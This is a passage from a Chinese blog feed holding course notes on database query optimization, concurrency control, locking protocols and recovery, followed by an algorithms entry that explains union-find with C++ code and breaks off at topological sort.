xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub></mrow><annotation encoding="application/x-tex">\sigma_{F}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>) × <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span><br> 对于选择条件只与其中一个关系有关，则应该先对那个关系做出选择，然后再做笛卡儿积。<br>②<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mi>F</mi></msub></mrow><annotation encoding="application/x-tex">\sigma_{F}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> × <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>) = <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{F1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">E_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>) × <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>σ</mi><mrow><mi>F</mi><mn>2</mn></mrow></msub></mrow><annotation encoding="application/x-tex">\sigma_{F2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">σ</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.13889em;">F</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>(<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>E</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">E_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>)<br> 选择条件对两个关系都有关，则应该先分别做选择，然后再做笛卡尔积。</p><h4 id="查询树的启发式优化"><a class="markdownIt-Anchor" href="#查询树的启发式优化">#</a> 查询树的启发式优化</h4><ul><li>这是对关系代数表示的查询树进行优化的方法</li></ul><h5 id="典型的启发式规则"><a class="markdownIt-Anchor" href="#典型的启发式规则">#</a> 典型的启发式规则</h5><ul><li><strong>【规则 1】选择运算应尽可能先做</strong>：这是为了<strong>减少中间结果的规模</strong></li><li><strong>【规则 2】投影和选择运算同时进行</strong>：这是为了<strong>避免重复扫描</strong></li><li><strong>【规则 3】将投影运算与其前后的双目运算结合起来</strong>：这是为了<strong>避免重复扫描</strong></li><li><strong>【规则 4】把某些选择运算和其前面的笛卡尔积结合起来成为一个连接运算</strong>：这是为了<strong>减少中间结果的规模</strong></li><li><strong>【规则 5】提取公共子表达式（公因子）</strong>：这是为了<strong>保存计算结果，避免重复计算</strong></li></ul><h5 id="实现算法"><a class="markdownIt-Anchor" href="#实现算法">#</a> 实现算法</h5><ul><li><strong>该算在遵循启发式规则，并应用关系代数表达式等价变换规则来优化关系表达式</strong></li><li><strong>该算法的输入和输出都是查询树（分别对应待优化和优化的关系表达式）</strong><br><strong>算法步骤：</strong></li><li><strong>【步骤 1】分解选择运算</strong>：这是为了<strong>便于不同的选择运算沿树的不同分枝向树叶移动，一直移动到与这个选择条件相关的关系处，使选择尽可能先做</strong></li></ul><h1 id="七并行控制技术"><a class="markdownIt-Anchor" href="#七并行控制技术">#</a> 七，并行控制技术</h1><h2 id="并发控制技术概述"><a class="markdownIt-Anchor" href="#并发控制技术概述">#</a> 并发控制技术概述</h2><p><strong>事务</strong>：指用户定义的一个数据库的操作序列，这些操作要么全做，要么全不做，是一个不可分割的工作单位。</p><ul><li><strong>原子性</strong>：事务中包括的操作要么都做，要么都不做</li><li><strong>一致性</strong>：事务执行的结果是从一个一致性状态转变到另一个一致性状态</li><li><strong>隔离性</strong>：一个事务的执行不应该被其他事务干扰</li><li><strong>持久性</strong>：事务成功后，对数据库的改变是永久的，即使以后系统出现故障也不会影响。<br>给出事务运行的方式：<strong>串行</strong>和<strong>并行</strong></li><li>串行：每个时刻只有一个事务运行 （<strong>优点</strong>：实现简单，保证事务一致性。<strong>缺点</strong>：效率低）</li><li>并行：同一个时刻可以有多个事务同时运行（<strong>优点</strong>：效率高，提高整个系统吞吐量，减少平均响应时间。<strong>缺点</strong>：破坏事务隔离性，导致数据库不一致性）<br>emm 这里给出 ppt 上讲的<strong>并行和并发的区别</strong></li><li>并行：多个处理器或者是多核的处理器同时处理多个不同的任务，物理上的同时发生</li><li>并发：一个处理器同时处理多个任务，逻辑上的同时发生</li></ul><h2 id="并发控制"><a class="markdownIt-Anchor" href="#并发控制">#</a> 并发控制</h2><h4 id="1并发控制带来的数据不一致行问题"><a class="markdownIt-Anchor" href="#1并发控制带来的数据不一致行问题">#</a> （1）并发控制带来的数据不一致行问题</h4><blockquote><p>以如下飞机订票系统中的活动序列为例<br>①甲售票点 (事务<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">T_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>）读出某航班的机票余额 A，设 A=16<br>②乙售票点 (事务<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>T</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">T_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">T</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>）读出同一航班的机票余额 A，也为 16。<br>③甲售票点卖出一张机票，修改余额 A←A-1，所以 A 为 15，把 A 写回数据库。<br>④乙售票点也卖出一 - 张机票，修改余额 A-A-1，所以 A 为 15，把 A 写回数据库。</p></blockquote><p><strong>A. 丢失修改</strong><br>指两个以上事务从数据库中读入同一个数据并修改，其中<strong>后提交的事务</strong>的提交结果破坏了<strong>前提交事务</strong>的提交结果，导致了<strong>先提交事务对数据库的修改丢失</strong>。<br><strong>B. 读脏数据</strong><br>事务 1 修改某一数据，并将其写回磁盘；事务 2 读取同一数据后，事务 1 犹豫某种原因被撤销，这时事务 1 已经修改过的数据被恢复为原值，事务 2 读到的不稳定的瞬间数据就与数据库中的数据产生了不一致，是不正确的数据，又称为脏数据<br><strong> C. 不可重复读</strong><br>事务 1 读取数据后，事务 2 执行了对读取数据的更新操作，事务 1 再次读取时无法再现上一次读取的结果。</p><h4 id="2并发控制概念"><a class="markdownIt-Anchor" href="#2并发控制概念">#</a> （2）并发控制概念</h4><p>如果多个用户并发存取数据的行为不加以控制，那么极有可能破坏事务的隔离性和一致性。因此并发控制就是为了保证多用户并发操作数据库中信息的正确性，一致性所采取的措施。</p><h2 id="封锁封锁协议活锁和死锁"><a class="markdownIt-Anchor" href="#封锁封锁协议活锁和死锁">#</a> 封锁，封锁协议活锁和死锁</h2><h4 id="一封锁"><a class="markdownIt-Anchor" href="#一封锁">#</a> 一，封锁</h4><p>【概念】封锁就是事务 T 在对某个数据对象操作之前，先向系统发出请求，对其加锁；加锁后事务 T 对该数据对象就有了一定的控制，在事务 T 释放它的锁之前，其他事务不能更新此数据对象。<br>【类型】</p><ul><li><strong>排他锁（X 锁）</strong>：又称为<strong>写锁</strong>，若事务 T 对数据对象 A 加上 X 锁，则<strong>只允许 T 读取和修改 A，其他任何事务都不能再对 A 加任何类型的锁</strong>，直到 T<strong> 释放</strong> A 上的锁</li><li><strong>共享锁（S 锁）</strong>：又称<strong>读锁</strong>，若事务 T 对数据对象 A 加上 S 锁，则其他事务<strong>只能再对 A 加 S 锁，而不能加 X 锁</strong>，直到 T<strong> 释放</strong> A 上的 S 锁<br><strong>附加：锁升级</strong></li><li>S 锁允许多个事务同时访问同一个数据对象 A，即允许更多的并发操作。这里我们可以让事务 T 先读取数据对象 A 后写入 A 的新值操作时，可以先申请 S 锁，当要写入时再将锁升级为 W 锁。<br>优点：提高并发执行效率          缺点：增加死锁的可能性</li></ul><h4 id="二封锁协议"><a class="markdownIt-Anchor" href="#二封锁协议">#</a> 二，封锁协议</h4><p>【概念】是指再运用 X 锁和 S 锁对数据对象加锁时需要遵照的一些规则。例如，何时申请，持续时间和何时释放等。不同的封锁协议，为并发操作的正确调度提供了一定的保证，所能达到的系统一致性级别也是不同的。常用的封锁协议有：</p><ul><li>支持一致性维护的<strong>三级封锁协议</strong></li><li>支持并行调度可串行化的<strong>两端封锁协议</strong><br>①一级封锁协议<br>事务 T 在修改数据 R 之前必须先对其加 X 锁，直到事务结束才释放</li><li>防止丢失修改</li><li>不能保证可重复读和不读脏数据<br>②二级封锁协议<br>在一级封锁协议的基础上，增加<strong>事务 T 在读取数据 R 之前必须先对其加上 S 锁</strong>，读取完成之后即可释放 S 锁</li><li>可以防止丢失修改和读脏数据</li><li>不能保证可重复读<br>③三级封锁协议<br>是指在一级封锁协议的基础上增加<strong>事务 T 在读取数据 R 之前必须对其加 S 锁，直到事务结束时才可以释放 S 锁</strong></li><li>放置了丢失修改和读脏数据，还防止了不可重复读</li></ul><h4 id="三饥饿活锁和死锁"><a class="markdownIt-Anchor" href="#三饥饿活锁和死锁">#</a> 三，饥饿，活锁和死锁</h4><p>一个问题的解决必然会导致另一个问题的出现。<strong>封锁技术可以有效地解决并发操作的一致性问题，但是会带来新的问题</strong></p><ul><li><strong>饥饿</strong>：由于<strong>不同锁的类型</strong>导致的，有希望获得<strong>排他锁</strong>，但由于不断获得<strong>共享锁</strong>可能永远等待<br>解决方法：事务 T 申请对数据项 R 加 M 型锁，允许加锁的条件：1，在 R 上不存在与 M 冲突的锁的其他事务。2，不存在等待对 R 加锁，且先于 T 申请加锁的事务</li><li><strong>活锁</strong>：由于<strong>调度顺序</strong>的随机性导致，有希望获得锁，但是由于调度顺序的选择，可能永远等待<br>解决方法：1，封锁管理子系统按照请求封锁的先后顺序对事务排队 2，一旦被申请的数据对象的锁释放，立即批准队列中的一个事务获得锁</li><li><strong>死锁</strong>：由于调度顺序的随机性导致，两个事务同时申请对方正在使用的数据资源，导致相互等待<br>死锁的解决方法：<strong>预防和检测</strong></li></ul><blockquote><p><strong>预防（不可行）</strong>：一次封锁，顺序封锁，基于时标的抢占和事务撤销技术</p><p><strong>检测（DBMS 常用方法）</strong>：超时法：一个事务等待的时间超过了规定的时间，就认为其发生了死锁<br>等待图法：用一个有向图 G，节点表示正在执行的事务，边表示等待情况。如果图中存在回路，则表示发生死锁。</p></blockquote><p><strong>检测后的诊断和修复</strong></p><ul><li>因素 1：选择一个处理死锁代价最小的事务，将其<strong>撤销</strong>，释放锁</li><li>因素 2：决定 rollback 多远。彻底撤销或者 rollback 到可以解决死锁为止。</li><li>因素 3：避免饥饿，避免因为某个事务 rollback 代价最小而一直被 rollback，在代价因素中包括事务的 rollback 次数即可解决。</li></ul><h4 id="四并发调度的可串行性两段锁协议和封锁的粒度"><a class="markdownIt-Anchor" href="#四并发调度的可串行性两段锁协议和封锁的粒度">#</a> 四，并发调度的可串行性，两段锁协议和封锁的粒度</h4><h5 id="一可串行化调度"><a class="markdownIt-Anchor" href="#一可串行化调度">#</a> 一，可串行化调度</h5><p>【概念】多个事务的并发执行是正确的，当且仅当其结果与某一次按次序<strong>串行执行</strong>这些事务时的结果相同，称这种调度策略为可串行化调度。<strong>可串行性</strong>是并发事务正确调度的准则，也即一个给定的并发调度，当且仅当它是可串行化的，才认为是<strong>正确调度</strong>。<br><strong>冲突操作</strong>：是指不同事务对同一个数据的<strong>读写操作</strong>和<strong>写写操作</strong>。除此之外，其他操作均为不冲突操作。<br><strong>冲突可串行化</strong>：一个调度 SC 在保证冲突操作的次序不变的情况下，通过交换两个事务不冲突操作的次序得到另一个调度 SC，如果 SC 是串行的，则称调度 SC 为冲突可串行化的调度。<strong>若一个调度是冲突可串行化的，那么它一定是可串行化的调度</strong>。</p><h5 id="二两段锁协议"><a class="markdownIt-Anchor" href="#二两段锁协议">#</a> 二，两段锁协议</h5><p>两端锁协议是三级封锁协议的特例，目前 DBMS 普遍采用该种协议实现并发调度的可串行性。具体内容如下：</p><ul><li>在对任何数据进行读，写操作之前，首先要申请并获得对该数据的封锁</li><li>在释放一个封锁之后，事务不再申请和获得任何其他封锁<br>其中‘两段’是指事务分为两个阶段：</li><li>第一阶段：获得封锁，也称为扩展阶段。如果该数据项被其他使用者加上不相容的锁，则必须等待。</li><li>第二阶段：释放封锁，也成为收缩阶段。事务在释放锁后，不允许再申请其他锁。</li></ul><h5 id="三封锁的粒度"><a class="markdownIt-Anchor" href="#三封锁的粒度">#</a> 三，封锁的粒度</h5><p>【概念】是指封锁对象的大小。封锁对象可以是<strong>逻辑单元</strong>，也可以是<strong>物理单元</strong>。封锁粒度与系统并发度和并发控制的开销密切相关，一般来说，封锁粒度越大，数据库所能封锁的数据单元就越少，并发度越小，开销就越小。</p><ul><li>逻辑单元：元组，关系，整个数据库等</li><li>物理单元：页，物理记录等<br><strong>选择封锁的原则</strong></li><li>需要处理多个关系的大量元组的用户事务时以<strong>数据库为封锁单位</strong></li><li>需要处理大量元组的用户事务时以<strong>关系</strong>为封锁单元</li><li>只处理少量元组的用户事务时以元组为封锁单位<br><strong>多粒度封锁</strong>：在一个系统中<strong>同时支持多种封锁粒度</strong>供不同的事务选择</li></ul><h1 id="数据库恢复技术"><a class="markdownIt-Anchor" href="#数据库恢复技术">#</a> 数据库恢复技术</h1><h2 id="一事务的基本概念"><a class="markdownIt-Anchor" href="#一事务的基本概念">#</a> 一，事务的基本概念</h2><p><strong>事务</strong>：是用户定义的一个数据库操作序列。这些操作要么全做，要么不做，是一个不可分割的工作单位。例如在 RDBMS 中一个事务可以是一条 SQL 语句或整个程序。事务是<strong>数据库恢复和并发控制</strong>的基本单位。一般来说，一个程序中包含多个事务。<br><strong>事务的定义</strong>：事物的开始和结束由用户显式控制。如果用户没有显式地定义事务，则由 DBMS 按默认规定自动划分事务。在 SQL 语句中，定义事务语句有以下三条：</p><ul><li><code>BEGIN TRANSACTION</code>  ：表示事务的开始</li><li><code>COMMIT</code> ：表示事务的正常结束并提交事务的所有操作</li><li><code>ROLLBACK</code> ：表示事务的结束，但没有正常结束，需要进行<strong>回滚</strong>（撤销已经完成的操作，使系统恢复至回滚前状态）</li></ul><h4 id="事务的四个特性acid"><a class="markdownIt-Anchor" href="#事务的四个特性acid">#</a> 事务的四个特性 ——ACID</h4><p>A. 数据库的 ACID<br>①：<strong>原子性</strong><br>事务是数据库的<strong>逻辑工作单位</strong>，事务中包含的诸多操作或全做或全不做。因故障未能做完的，需要有一套机制用于撤销那一部分已经做了的。<br>②：<strong>一致性</strong><br>事务执行的结果必须是使数据库从<strong>一个一致性状态边到另一个一致性状态</strong></p><ul><li>一致性状态：数据库中只包含成功事务提交的结果</li><li>不一致状态：数据库中包含事务未完成时的状态<br>③：<strong>隔离性</strong><br>一个事务不能被其他事务干扰。也即一个事务的内部操作及使用的数据对其他并发事务是隔离的，并发执行的各个事务之间不能<strong>互相干扰</strong><br>④：<strong>持续性</strong><br>一个事务一旦提交，它对数据库中的数据的改变就是<strong>永久性</strong>的。接下来的其他操作或故障不应该对其执行结果有任何影响<br> B: 破坏 ACID 的因素</li><li>故障：没有执行完；虽然没有完，但是存储介质故障</li><li>并发干扰：</li></ul>]]></content>
      
      
      <categories>
          
          <category> 课程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法学习</title>
      <link href="/2023/11/15/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/11/15/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>这里更新主要更新一些 模板 / 数据结构 /… 的题目吧</p><h1 id="图"><a class="markdownIt-Anchor" href="#图">#</a> 图</h1><h3 id="并查集"><a class="markdownIt-Anchor" href="#并查集">#</a> 并查集</h3><p>【定义】：用来管理元素分组情况的数据结构。并查集可以高效的进行如下操作：</p><ul><li>查询元素 a 和元素 b 是否属于同一组</li><li>合并元素 a 和 b 所在的组<br><strong>需要注意并查集只能进行合并操作，但是无法进行分割操作</strong><br>【结构】：并查集是利用树形结构实现的。不过不是二叉树。<br>（1）初始化：<br>首先准备 n 个节点代表 n 个元素。最开始没有边。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(1).png?raw=true" alt="初始化"><br>（2）合并：<br>如图，从一个组的根向另一个组的根连边，这样两棵树变成一颗树，也就把两个组合合并为一个组。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot(2).png?raw=true" alt="合并"><br>（3）查询：<br>为了查询两个节点是否属于同一组，需要沿着树向上走，来查询包含这个元素的根是谁。两个节点走到同一个根，则说明他们属于同一组。下图 5，2 走到 1，7 走到 6，所以 7 和 2，5 不是同一组。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screenshot.png?raw=true" alt="查询"><br><strong>并查集实现中注意的点：</strong><br>避免退化！</li><li>对于每颗树，记录这棵树的高度（rank）</li><li>合并时如果两棵树的 rank 不同，则 rank 小的向 rank 大的连边。<br>此外，通过路径压缩，可以使并查集更高效。对每个节点，一旦走到了一次根节点，就把这个点到父亲的边改为直连连向根。如图<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/screensho1.png?raw=true" alt="路径压缩"></li></ul><p><strong>这里给出并查集的实现</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> par[MAX_N]; <span class="comment">//父亲</span></span><br><span class="line"><span class="type">int</span> rank[MAX_N]; <span class="comment">//树的高度</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 初始化n个元素</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">par[i] = i;</span><br><span class="line">rank[i] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//查询树的根</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">find</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(par[x] == x)&#123;</span><br><span class="line"><span class="keyword">return</span> x;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> par[x] = <span class="built_in">find</span>(par[x]); <span class="comment">//路径压缩</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 合并x和y所属的集合</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">unite</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">x = <span class="built_in">find</span>(x);</span><br><span class="line">y = <span class="built_in">find</span>(y);</span><br><span class="line"><span class="keyword">if</span>(x == y) <span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(rank[x] &lt; rank[y])&#123;</span><br><span class="line">par[x] = y;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">par[y] = x;</span><br><span class="line"><span class="keyword">if</span> (rank[x] == rank[y]) rank[x]++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 判断 x 和 y 是否属于同一个集合</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">same</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">find</span>(x) == <span class="built_in">find</span>(y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="并查集题目扩展思路"><a class="markdownIt-Anchor" href="#并查集题目扩展思路">#</a> 并查集题目扩展思路</h4><p>这里遇到了一个很有意思的题，类型是：类似于倒着的并查集连接，当一个图失去了某个顶点，求当前图是否连通，或者当前图有几个联通分量。思路是记录各边，倒着以并查集合并的方式做题。<br><a href="https://www.luogu.com.cn/problem/P3144">P3144 [USACO16OPEN] Closing the Farm S</a><br><a href="https://www.luogu.com.cn/problem/P1197">P1197 [JSOI2008] 星球大战 </a> 这道题有一个很好的数据结构，链式前向星来表示边，这样可以查看特定的与某个相连的顶点的所有边</p><h3 id="拓扑排序"><a class="markdownIt-Anchor" href="#拓扑排序">#</a> 拓扑排序</h3><p><strong>有向无环图</strong><br>如果有一个有向图的任意顶点都无法通过一些有向边回到自身，那么称这个有向图为有向无环图（DAG）。<br><strong>拓扑排序</strong>是指将有向无环图 G 的所有顶点排成一个线性序列，使得对图 